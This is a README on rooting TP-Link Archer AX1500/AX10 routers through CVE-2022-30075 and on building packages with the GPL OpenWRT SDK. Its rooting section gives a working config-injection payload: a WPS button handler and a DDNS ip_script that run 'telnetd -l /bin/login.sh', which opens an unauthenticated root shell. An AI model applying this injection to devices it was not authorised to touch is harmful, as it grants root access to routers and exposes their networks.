# TP-Link Archer AX1500 v1, AX1500 v1.2, AX10 v1, AX10 v1.2 GPL compilation utils. 

These scripts are optimized for the TP-Link Archer AX1500 v1, v1.2; Archer AX10 v1, v1.2 routers. This repository provides information regarding the way to root these routers and to compile GPL sources.

The GPL sources provided by TP-Link contain a lot of helpful tools to work with these routers. Altough GPL codes do not build binary installable firmware, they provide the kernel and OpenWRT SDK. The OpenWRT SDK allows developers to build their packages and even kernel modules for the router. But GPL is useless if you have no access to your router, so before the compilation of sources, you should [root the router](#rooting).

## Rooting

For the information and research in the rooting strategies a big thank you goes to [@gmaxus](https://github.com/gmaxus). He got in touch with me and we were able to find the necessary information and finally root the router. 

So... rooting. In fact, rooting your router is considered a hack and it is not supported by TP-Link, thus your warranty could be void. As of now, here is [CVE 2022-30075](https://nvd.nist.gov/vuln/detail/cve-2022-30075) in the old versions of the firmware that allows rooting. The CVE is implemented in https://github.com/aaronsvk/CVE-2022-30075 and we will use this repository. @gmaxus and I were able to root our devices with a few modifications to the configuration file.

Before the hacking process you should ensure that you're running a firmware with the CVE unpatched. Just install one released before July 2022. On my router, a downgrade to v1.3.1 did the trick. You can find the firmware files using the web archive. I was not able to install v1.2.*, but v1.3.1 also has the exploit. If you are not able to jump from the latest version to v1.3.1, downgrade by one version at a time. I was able to install US v1.3.1 on my device. Useful links:
https://www.tp-link.com/ru/support/download/archer-ax1500/v1/#Firmware
https://web.archive.org/web/20230520093831/https://www.tp-link.com/us/support/download/archer-ax1500/v1/

Although the download link to the firmware binary may not be archived, it should still be accessible via TP-Link's servers.

You should follow these steps:
- Clone the repository `git clone https://github.com/aaronsvk/CVE-2022-30075.git`.
- cd into it `cd CVE-2022-30075`.
- Install the required python packages `pip install requests pycryptodome`. If you get some errors here, you may want to install python 3.9 in your virtual environment.
- Download the configuration file from the router with the command `python tplink.py -b -t 192.168.0.1 -p your_password` where your_password is the password you use to log into the router and 192.168.0.1 is the IP address. This command will load the configuration from your router.
- Fix the configuration. The configuration is stored in `ArcherAX1500v120220401131n/ori-backup-user-config.xml`. Note that the directory name may vary from device to device. You should replace
```
<button name="wps_button">
<action>released</action>
<max>1999</max>
<handler>/lib/wifi/wps_button</handler>
<min>0</min>
<button>wifi</button>
</button>
```
with
```
<button name="exploit">
<action>released</action>
<max>1999</max>
<handler>/usr/sbin/telnetd -l /bin/login.sh</handler>
<min>0</min>
<button>wifi</button>
</button>
```
as well as
```
<ddns>
<provider name="provider">
<provider>tp-link</provider>
</provider>
<service name="dyndns">
<enabled>off</enabled>
<interface>wan</interface>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<service_name>dyndns.org</service_name>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
<service name="noip">
<service_name>noip.com</service_name>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<interface>wan</interface>
<enabled>off</enabled>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<wan_bind>disable</wan_bind>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
</ddns>
```
to
```
<ddns>
<provider name="provider">
<provider>tp-link</provider>
</provider>
<service name="dyndns">
<enabled>off</enabled>
<interface>wan</interface>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<service_name>dyndns.org</service_name>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
<service name="noip">
<service_name>noip.com</service_name>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<interface>wan</interface>
<enabled>off</enabled>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<wan_bind>disable</wan_bind>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
<service name="exploit">
<ip_script>/usr/sbin/telnetd -l /bin/login.sh</ip_script>
<username>X</username>
<retry_unit>seconds</retry_unit>
<check_interval>12</check_interval>
<interface>internet</interface>
<enabled>on</enabled>
<force_unit>days</force_unit>
<check_unit>hours</check_unit>
<domain>x.example.org</domain>
<password>X</password>
<retry_interval>5</retry_interval>
<ip_source>script</ip_source>
<update_url>http://127.0.0.1/</update_url>
<force_interval>30</force_interval>
<retry_times>3</retry_times>
</service>
</ddns>
```

The settings may vary from one device to another. In that case you should just find the `<ddns></ddns>` section and append
```
<service name="exploit">
<ip_script>/usr/sbin/telnetd -l /bin/login.sh</ip_script>
<username>X</username>
<retry_unit>seconds</retry_unit>
<check_interval>12</check_interval>
<interface>internet</interface>
<enabled>on</enabled>
<force_unit>days</force_unit>
<check_unit>hours</check_unit>
<domain>x.example.org</domain>
<password>X</password>
<retry_interval>5</retry_interval>
<ip_source>script</ip_source>
<update_url>http://127.0.0.1/</update_url>
<force_interval>30</force_interval>
<retry_times>3</retry_times>
</service>
```
into it.

This configuration injects the _malicious code_ that will start the telnet session on your router. And anyone from the local network will be able to connect to it. Please note that if iptables are misconfigured, you may be exposed to the internet and anyone can connect to the root session of your router. You should use it carefully. You may want to change that telnet command to something like an automated bash script in the future.

Now you should run `python tplink.py -t 192.168.0.1 -p your_password -r ArcherAX1500v120220401131n` which is likely the same as the previous one except that it will commit the new configuration to the router. It will reboot automatically.

After that you should click the WPS button on the router and the telnet session will be opened.
Connect to it with `telnet 192.168.0.1`. On windows you may use the telnet session in PuTTY.

Now you are running as root and you can do anything with your device. The original filesystem is read-only, packed and securely stored on your device so anything you change here will revert after a restart. You'll be able to modify firewall settings, install packages in temporary storage (RAM). My router has 256MB of RAM which is more than enough for it to function optimally. But you should never forget about the security hole and close the telnet session as soon as possible (`killall -9 telnetd` should do the trick).

Now that you have root access, you may continue your research on hacking this router further.

In the next chapters I will show you how to compile the GPL sources and use the OpenWRT SDK.

But before we start, here is an important thing to mention: if you want to run a standalone static program, you probably don't need the SDK. You can just statically compile it for armv7 and it will work.

Another thing worth mentioning is that I couldn't find a proper way to write directly to the router's storage but we can normally work within memory (RAM) (just use the /tmp directory). Preparing a script for it to automate everything after each time it reboots is an option. Unfortunately, you'll have to run this script from an http server rather than https since the latter is not supported. 


## GPL

It is based on Ubuntu 12.04 (Precise Pangolin) and uses Docker to run it on any host.

How to run:
- Build a Docker image `docker build -t router_build .`
- Enter a Docker container and mount sources as a volume `docker run -it -v /home/vetrov/ax1500v1_GPL:/router router_build`    
- cd to the volume `cd /router`
- Patch the sources. `patch -p1 < ../router.patch` This step updates source mirrors from where files should be downloaded. Files keep their checksums.
- Update luci. `mkdir -p Iplatform/openwrt/dl/ && cp /luci-0.11.1.tar.gz /router/Iplatform/openwrt/dl/`
- Update mtd-utils. `cp /mtd-utils-1.4.5.tar.gz /router/Iplatform/openwrt/dl/`
I wasn't able to patch this package so I decided to simply download it and pass it to `make` The checksum doesn't change because you downloaded the file from a mirror git repository with the same commit hash (check Dockerfile).
- Go to the build directory `cd Iplatform/build`
- Make the sources `make SHELL=/bin/bash V=s` Shell=/bin/bash ensures that make will use bash by default (needed for building), V=s enables verbose mode that produces more detailed output. In the beginning of the make process it will ask you for details. Feel free to simply press enter and choose all the default options.

Possible errors in the build process: GPL sources are an extremly outdated thing. Errors seem to be generated randomly. This repository just makes them less painful.

Lots of packages are too old (circa 2013) and many have been deleted from mirrors and even certain mirrors may have been disabled. If any errors are encountered during the build process, it is likely related to the internet resources providing the packages. To resolve these errors, you have to manually find the specific version of the package and update each Makefile (for reference, see router.patch).

## GPL usecases

The GPL source code offers us an OpenWRT SDK with the Linux kernel for the router. We don't know the way to build a standalone firmware file but it's still useful for other purposes. 

You can use the GPL source code to build packages and kernel modules for your router.

Note that opkg will always report "no free space in /tmp". You can bypass it using `opkg install /tmp/package.ipk -o /tmp --force-space --nodeps`.

Now, let's taka a look at how packages can be built. I will show you the building process on my own package for OpenWRT since it provides both userspace and kernel space versions while being relatively easy to understand.

First of all, you should locally clone the package repository:
```
git clone https://github.com/Waujito/yotubeUnblock -b openwrt
```

Now you have the repository with both userspace and kernel versions. Let's build the userspace variant:

Take a look at youtubeUnblock/youtubeUnblock/Makefile:
```make
# This file is used by OpenWRT SDK buildsystem to package the application for routers.

include $(TOPDIR)/rules.mk

PKG_NAME:=youtubeUnblock
PKG_VERSION:=1.0.0
PKG_REV:=2d1b58bc6d6dbe397dee1dd1729129bc4871b890
PKG_RELEASE:=1

PKG_SOURCE_URL:=https://github.com/Waujito/youtubeUnblock.git
PKG_SOURCE_PROTO:=git
PKG_SOURCE_VERSION:=$(PKG_REV)

...
```

And this is the place where problems may come: old versions of OpenWRT do not support downloading packages from git, so we should provide tar archives ourselves:

```
# This file is used by OpenWRT SDK buildsystem to package the application for routers.

include $(TOPDIR)/rules.mk

PKG_NAME:=youtubeUnblock
PKG_VERSION:=1.0.0-rc1
PKG_REV:=2d1b58bc6d6dbe397dee1dd1729129bc4871b890
PKG_RELEASE:=1

PKG_SOURCE:=v$(PKG_VERSION).tar.gz
PKG_SOURCE_URL:=https://github.com/Waujito/youtubeUnblock/archive/refs/tags

...

```

The same should be applied for youtubeUnblock/kyoutubeUnblock/Makefile (kernel module). `include $(INCLUDE_DIR)/kernel.mk` should be kept.

Then you should run `make menuconfig` and find your package there. Packages will be sorted by category. For example, youtubeUnblock will be in the top-level Networking category. Press space to select. 

Then you'd want to run `make package/youtubeUnblock/compile V=s` and `make package/youtubeUnblock/compile V=s` to compile the userspace app and the kernel module respectively (you don't need both, my aim is to cover all usecases).

Now, once the packages are built, you can find them in `bin/model_brcm_bcm490x-/packages/`: `kmod-youtubeUnblock_+1.0.0-rc1-model_brcm_bcm490x-1_model_brcm_bcm490x.ipk` and `youtubeUnblock_1.0.0-rc1-model_brcm_bcm490x-1_model_brcm_bcm490x.ipk`. You should deliver them to the router. I personally opened an nginx server on my local machine and put the packages there, then downloaded them through the router:
```sh
root@Archer_AX1500:/tmp# wget http://192.168.0.227/static/kmod-youtubeUnblock_%2B1.0.0-rc1-model_brcm_bcm490x-1_model_brcm_bcm490x.ipk
root@Archer_AX1500:/tmp# wget http://192.168.0.227/static/youtubeUnblock_1.0.0-rc1-model_brcm_bcm490x-1_model_brcm_bcm490x.ipk
```

Next you'd want to install the packages with opkg. opkg will report some errors and we'll need to bypass them:
- `make_directory: Cannot create directory //usr/lib/opkg': Read-only file system.` -- This error occurs because of the read-only filesystem; point opkg to /tmp: `opkg install package.ipk -o /tmp`
- `opkg_conf_load: Could not create lock file /tmp//var/lock/opkg.lock: No such file or directory.` -- Create the lock file manually: `mkdir -p /tmp/var/lock`
- `verify_pkg_installable: Only have 0kb available on filesystem /tmp/, pkg kmod-youtubeUnblock needs 16` -- Pass `--force-space`: `opkg install package.ipk -o /tmp --fore-space`
- `satisfy_dependencies_for: Cannot satisfy the following dependencies for` -- opkg cannot determine dependencies because of the use of a custom directory. Just use the `--nodeps` flag to bypass it: `opkg install package.ipk -o /tmp --fore-space --nodeps`

The complete installation command will be:
```sh
opkg install kmod-youtubeUnblock_\%2B1.0.0-rc1-model_brcm_bcm490x-1_model_brcm_bcm490x.ipk -o /tmp --force-space --nodeps
opkg install youtubeUnblock_1.0.0-rc1-model_brcm_bcm490x-1_model_brcm_bcm490x.ipk -o /tmp --force-space --nodeps
```

For kernel modules you may want to run insmod: 
```sh
insmod lib/modules/iplatform/kyoutubeUnblock.ko
```

For userspace utilities - daemonize:
```sh
(./usr/bin/youtubeUnblock &>/tmp/logs.txt &)
```

Note about brackets: It is a hack to start a daemon that won't be closed in case the current shell exits.

Enjoy some semi-free software! :)

Thanks JonathanNakandala for your [post on the OpenWRT forum](https://forum.openwrt.org/t/tp-link-archer-ax1500-70-802-11ax-router-support/48781/22) with your early research on this topic and [@gmaxus](https://github.com/gmaxus) for you help with rooting!
